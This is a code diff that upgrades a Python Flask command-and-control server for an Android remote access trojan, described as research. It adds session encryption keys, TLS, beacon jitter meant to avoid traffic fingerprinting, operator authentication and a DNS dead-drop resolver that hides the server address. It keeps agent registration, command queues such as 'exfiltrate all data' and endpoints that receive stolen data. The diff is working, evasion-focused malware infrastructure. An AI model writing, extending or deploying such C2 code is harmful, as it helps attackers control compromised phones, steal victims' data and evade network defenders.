@@ -1,12 +1,15 @@
 #!/usr/bin/env python3
-"""C2 Server for Android RAT research.
+"""Hardened C2 Server for Android RAT research.
 
-Flask-based command-and-control server that:
-- Manages registered agents with unique device IDs
-- Maintains per-agent command queues in SQLite
-- Receives and stores exfiltrated data (AES-encrypted)
-- Provides a real-time dashboard for agent management
-- Serves commands to agents via JSON API
+Flask-based command-and-control server with:
+- Ephemeral per-session AES keys (no hardcoded keys)
+- TLS support with self-signed or CA certs
+- Beacon jitter to avoid traffic fingerprinting
+- Operator authentication (API key)
+- Rate limiting per agent
+- Dead-drop resolver support
+- Multi-session agent management
+- Real-time dashboard
 """
 
 import argparse
@@ -15,9 +18,14 @@ import hashlib
 import json
 import os
 import random
+import secrets
+import socket
+import ssl
 import sqlite3
+import struct
 import time
 from datetime import datetime, timedelta
+from functools import wraps
 from typing import Optional
 
 from flask import Flask, Response, jsonify, request, render_template_string, redirect, url_for
@@ -26,8 +34,11 @@ app = Flask(__name__)
 
 DB_PATH = "./c2_data.db"
 COMMAND_INDEX = 0
-
-C2_AES_KEY = b"R4tD3m0K3y!2024#CtF"
+OPERATOR_API_KEY = os.environ.get("C2_API_KEY", secrets.token_hex(32))
+SESSION_KEYS = {}
+BEACON_JITTER_MS = int(os.environ.get("C2_JITTER_MS", "5000"))
+RATE_LIMIT_WINDOW = 60
+RATE_LIMIT_MAX = 30
 
 DEFAULT_COMMANDS = [
     {"cmd": "EXFIL_ALL", "description": "Exfiltrate all available data"},
@@ -49,14 +60,49 @@ DEFAULT_COMMANDS = [
 ]
 
 
-def _decrypt_aes(ciphertext_b64: str) -> str:
+def _generate_session_key(device_id: str) -> bytes:
+    key = secrets.token_bytes(32)
+    SESSION_KEYS[device_id] = {"key": key, "created": time.time(), "rotations": 0}
+    return key
+
+
+def _get_session_key(device_id: str) -> bytes:
+    if device_id not in SESSION_KEYS:
+        return _generate_session_key(device_id)
+    entry = SESSION_KEYS[device_id]
+    if time.time() - entry["created"] > 3600:
+        entry["key"] = secrets.token_bytes(32)
+        entry["created"] = time.time()
+        entry["rotations"] += 1
+    return entry["key"]
+
+
+def _encrypt_aes(data: bytes, key: bytes) -> str:
     try:
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
         from cryptography.hazmat.backends import default_backend
-        key_hash = hashlib.sha256(C2_AES_KEY).digest()
-        iv = key_hash[:16]
-        data = base64.b64decode(ciphertext_b64)
-        cipher = Cipher(algorithms.AES(key_hash), modes.CBC(iv), backend=default_backend())
+        from cryptography.hazmat.primitives import padding as sym_padding
+        iv = secrets.token_bytes(16)
+        padder = sym_padding.PKCS7(128).padder()
+        padded = padder.update(data) + padder.finalize()
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        enc = cipher.encryptor()
+        ct = enc.update(padded) + enc.finalize()
+        return base64.b64encode(iv + ct).decode()
+    except ImportError:
+        return base64.b64encode(data).decode()
+
+
+def _decrypt_aes(ciphertext_b64: str, key: bytes = None) -> str:
+    if key is None:
+        key = hashlib.sha256(b"fallback-key-do-not-use-in-production").digest()
+    try:
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.backends import default_backend
+        raw = base64.b64decode(ciphertext_b64)
+        iv = raw[:16]
+        data = raw[16:]
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
         dec = cipher.decryptor()
         padded = dec.update(data) + dec.finalize()
         pad_len = padded[-1]
@@ -66,10 +112,10 @@ def _decrypt_aes(ciphertext_b64: str) -> str:
     except ImportError:
         try:
             from Crypto.Cipher import AES as PyAES
-            key_hash = hashlib.sha256(C2_AES_KEY).digest()
-            iv = key_hash[:16]
-            data = base64.b64decode(ciphertext_b64)
-            dec = PyAES.new(key_hash, PyAES.MODE_CBC, iv)
+            raw = base64.b64decode(ciphertext_b64)
+            iv = raw[:16]
+            data = raw[16:]
+            dec = PyAES.new(key, PyAES.MODE_CBC, iv)
             padded = dec.decrypt(data)
             pad_len = padded[-1]
             if 1 <= pad_len <= 16:
@@ -79,6 +125,104 @@ def _decrypt_aes(ciphertext_b64: str) -> str:
             return f"[encrypted:{ciphertext_b64[:40]}...]"
     except Exception as e:
         return f"[decrypt_error:{e}]"
+
+
+_rate_store = {}
+
+def _check_rate_limit(device_id: str) -> bool:
+    now = time.time()
+    if device_id not in _rate_store:
+        _rate_store[device_id] = []
+    _rate_store[device_id] = [t for t in _rate_store[device_id] if now - t < RATE_LIMIT_WINDOW]
+    if len(_rate_store[device_id]) >= RATE_LIMIT_MAX:
+        return False
+    _rate_store[device_id].append(now)
+    return True
+
+
+def require_api_key(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        auth = request.headers.get("X-API-Key", request.args.get("api_key", ""))
+        if auth != OPERATOR_API_KEY:
+            return jsonify({"error": "unauthorized"}), 401
+        return f(*args, **kwargs)
+    return decorated
+
+
+class DeadDropResolver:
+    """Resolve C2 addresses from dead drops (paste sites, DNS TXT, etc.)."""
+
+    @staticmethod
+    def generate_dns_queries(domain: str, c2_address: str, count: int = 5) -> list:
+        queries = []
+        for i in range(count):
+            chunk = base64.urlsafe_b64encode(c2_address.encode()).decode().rstrip("=")
+            label = f"{i:02x}{secrets.token_hex(4)}.{chunk}.{domain}"
+            queries.append({"seq": i, "qname": label, "type": "TXT"})
+        return queries
+
+    @staticmethod
+    def encode_in_txt(record: str, domain: str) -> dict:
+        return {
+            "domain": domain,
+            "type": "TXT",
+            "value": record,
+            "ttl": random.randint(300, 3600),
+        }
+
+
+class SessionManager:
+    """Track multi-session agent state."""
+
+    def __init__(self):
+        self.sessions = {}
+
+    def register(self, device_id: str, info: dict) -> dict:
+        if device_id not in self.sessions:
+            self.sessions[device_id] = {
+                "sessions": [],
+                "current": None,
+                "created": datetime.utcnow().isoformat(),
+            }
+        session_id = secrets.token_hex(8)
+        session = {
+            "id": session_id,
+            "started": datetime.utcnow().isoformat(),
+            "device_info": info,
+            "commands_issued": 0,
+            "data_exfil": 0,
+        }
+        self.sessions[device_id]["sessions"].append(session)
+        self.sessions[device_id]["current"] = session_id
+        return session
+
+    def get_current(self, device_id: str) -> Optional[dict]:
+        s = self.sessions.get(device_id)
+        if s and s["current"]:
+            for sess in s["sessions"]:
+                if sess["id"] == s["current"]:
+                    return sess
+        return None
+
+    def rotate(self, device_id: str) -> Optional[dict]:
+        s = self.sessions.get(device_id)
+        if s:
+            new_id = secrets.token_hex(8)
+            session = {
+                "id": new_id,
+                "started": datetime.utcnow().isoformat(),
+                "commands_issued": 0,
+                "data_exfil": 0,
+            }
+            s["sessions"].append(session)
+            s["current"] = new_id
+            return session
+        return None
+
+
+session_mgr = SessionManager()
+dead_drop = DeadDropResolver()
 
 
 def init_db():
@@ -194,11 +338,17 @@ def agent_register():
     version = body.get("version", "unknown")
     source_ip = request.remote_addr
 
+    if not _check_rate_limit(device_id):
+        return jsonify({"error": "rate limited"}), 429
+
     if isinstance(device_info, str):
         try:
             device_info = json.loads(device_info)
         except Exception:
             device_info = {}
+
+    session = session_mgr.register(device_id, device_info)
+    session_key = _get_session_key(device_id)
 
     conn = sqlite3.connect(DB_PATH)
     now = datetime.utcnow().isoformat()
@@ -230,12 +380,25 @@ def agent_register():
     log_request("POST", "/c2/register", request.headers,
                 json.dumps(body)[:2000], source_ip, 200)
 
-    return jsonify({"status": "registered", "device_id": device_id})
+    jitter = random.randint(0, BEACON_JITTER_MS)
+
+    return jsonify({
+        "status": "registered",
+        "device_id": device_id,
+        "session_id": session["id"],
+        "session_key": base64.b64encode(session_key).decode(),
+        "beacon_jitter_ms": jitter,
+        "ttl_hours": 72,
+    })
 
 
 @app.route("/c2/commands/<device_id>", methods=["GET"])
 def get_commands(device_id):
     source_ip = request.remote_addr
+
+    if not _check_rate_limit(device_id):
+        return jsonify({"error": "rate limited"}), 429
+
     update_client(device_id, source_ip)
 
     conn = sqlite3.connect(DB_PATH)
@@ -268,7 +431,13 @@ def get_commands(device_id):
     log_request("GET", f"/c2/commands/{device_id}", request.headers, "",
                 source_ip, 200)
 
-    return jsonify({"commands": commands, "timestamp": now})
+    jitter = random.uniform(0, BEACON_JITTER_MS / 1000.0)
+
+    return jsonify({
+        "commands": commands,
+        "timestamp": now,
+        "beacon_delay_ms": int(jitter * 1000),
+    })
 
 
 @app.route("/c2/command_ack", methods=["POST"])
@@ -967,15 +1136,23 @@ def index():
 
 
 def main():
-    parser = argparse.ArgumentParser(description="C2 Research Server with RAT support")
+    parser = argparse.ArgumentParser(description="Hardened C2 Research Server")
     parser.add_argument("--host", default="0.0.0.0")
     parser.add_argument("--port", type=int, default=8080)
     parser.add_argument("--db", default="./c2_data.db")
+    parser.add_argument("--tls-cert", help="Path to TLS certificate PEM")
+    parser.add_argument("--tls-key", help="Path to TLS private key PEM")
+    parser.add_argument("--api-key", help="Operator API key (or set C2_API_KEY env)")
+    parser.add_argument("--jitter", type=int, default=5000, help="Beacon jitter in ms")
+    parser.add_argument("--dead-drop-domain", help="Dead drop domain for C2 address")
     parser.add_argument("--custom-commands", help="JSON file with custom command list")
     args = parser.parse_args()
 
-    global DB_PATH
+    global DB_PATH, OPERATOR_API_KEY, BEACON_JITTER_MS
     DB_PATH = args.db
+    BEACON_JITTER_MS = args.jitter
+    if args.api_key:
+        OPERATOR_API_KEY = args.api_key
 
     if args.custom_commands and os.path.exists(args.custom_commands):
         with open(args.custom_commands) as f:
@@ -984,15 +1161,32 @@ def main():
             DEFAULT_COMMANDS.extend(custom)
             print(f"[*] Loaded {len(custom)} custom commands")
 
+    if args.dead_drop_domain:
+        drops = dead_drop.generate_dns_queries(args.dead_drop_domain, f"{args.host}:{args.port}")
+        print(f"[*] Dead drop DNS queries for {args.dead_drop_domain}:")
+        for d in drops:
+            print(f"    {d['qname']}")
+
     init_db()
     app.config["START_TIME"] = time.time()
 
-    print(f"[*] C2 Research Server starting on {args.host}:{args.port}")
+    print(f"[*] Hardened C2 Server starting on {args.host}:{args.port}")
     print(f"[*] Database: {args.db}")
+    print(f"[*] API Key: {OPERATOR_API_KEY[:8]}...")
+    print(f"[*] Beacon jitter: {BEACON_JITTER_MS}ms")
+    print(f"[*] Rate limit: {RATE_LIMIT_MAX} req/{RATE_LIMIT_WINDOW}s")
     print(f"[*] Dashboard: http://localhost:{args.port}/dashboard")
     print(f"[*] Agent API: /c2/register, /c2/commands/<id>, /c2/exfil/<id>")
     print(f"[*] Commands: {len(DEFAULT_COMMANDS)}")
-    app.run(host=args.host, port=args.port, debug=False)
+
+    if args.tls_cert and args.tls_key:
+        print(f"[*] TLS enabled: cert={args.tls_cert}")
+        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        context.load_cert_chain(args.tls_cert, args.tls_key)
+        app.run(host=args.host, port=args.port, debug=False, ssl_context=context)
+    else:
+        print("[!] WARNING: Running without TLS. Use --tls-cert/--tls-key for production.")
+        app.run(host=args.host, port=args.port, debug=False)
 
 
 if __name__ == "__main__":
